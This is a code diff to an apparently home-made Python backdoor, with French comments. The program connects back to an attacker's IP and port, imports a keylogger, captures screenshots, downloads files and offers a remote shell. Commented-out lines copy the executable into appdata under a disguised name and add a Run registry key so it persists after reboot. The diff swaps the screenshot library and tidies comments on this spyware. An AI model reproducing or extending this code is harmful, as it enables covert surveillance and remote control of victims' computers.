@@ -9,11 +9,11 @@ import base64
 import shutil
 import sys
 import time
-import requests #va savoir pk mais requests marche pas en le compilant sur windows, remplace par urllib
+import requests
 import urllib.request
-from mss import mss #marche pas sur windows
+from PIL import ImageGrab
 import threading
-import keylogger #le nom de notre keylogger dans le mm repertoire, marche sur windows mais pas depuis linux
+import keylogger #le nom de notre keylogger dans le mm repertoire
 
 iptoconnect = "192.168.0.100" #si on fait une attaque a travers internet avec port forward, il faut l'ip publique du routeur, et le port forward du routeur
 porttoconnect = 51234
@@ -50,8 +50,9 @@ def is_admin():
 		admin = "[+] Administrator Privileges !"
 
 def screenshot():
-	with mss() as screenshot: #n'importe quel nom
-		screenshot.shot()
+	screenshot = ImageGrab.grab()
+	screenshot.save("monitor-1.png", 'PNG')
+
 
 def download(url):
 	get_response = urllib.request.urlretrieve(url, url.split("/")[-1])
@@ -145,7 +146,6 @@ def shell():
 #location = os.environ["appdata"] + "\\windows32.exe" #ca va trouver le path appdata sur la target pc
 #if not os.path.exists(location): #on veut creer un fichier seulement s'il existe pas
 #	shutil.copyfile(sys.executable,location) #copie l'executable currently running
-#	#pas oblige
 #	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows32 /t REG_SZ /d "' + location + '"', shell=True) #va creer un cle de registre qui va run notre file apres chaque redemarrage, backdoor on met le nom qu'on veut
 
 	#seulement la 1ere fois
